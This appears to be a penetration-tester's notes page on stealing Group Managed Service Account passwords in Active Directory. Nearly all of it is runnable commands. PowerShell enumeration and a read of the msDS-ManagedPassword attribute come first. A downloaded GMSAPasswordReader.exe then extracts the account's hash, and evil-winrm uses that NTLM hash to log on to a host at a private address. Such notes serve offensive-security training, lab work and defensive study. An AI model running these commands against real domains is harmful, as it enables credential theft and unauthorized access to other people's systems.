# GMSA password retrieval

Reference: [Reading GMSA Password](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-gmsa-password)

### Enumeration

{% code overflow="wrap" %}
```bash
# Target machine
# Check domain username and see any service account
PS> net users /domain 

# Check svc_apache properties
PS> Get-ADServiceAccount -Identity 'svc_apache$' -Properties *

# Enumerate if you can get a password from the service account
PS> Get-ADServiceAccount -Identity 'svc_apache$' -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword

# Check if you can get a password hash
get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
$gmsa = Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
$mp
```
{% endcode %}

### Get Password Hash

{% code overflow="wrap" %}
```bash
# https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe

PS> ./GMSAPasswordReader.exe --accountname svc_apache
```
{% endcode %}

### Logon to the target machine

```bash
# winrm example
evil-winrm -i 192.168.174.165 -u svc_apache$ -H 41BCD07B8CC9636826FE07FF9539CA57
```

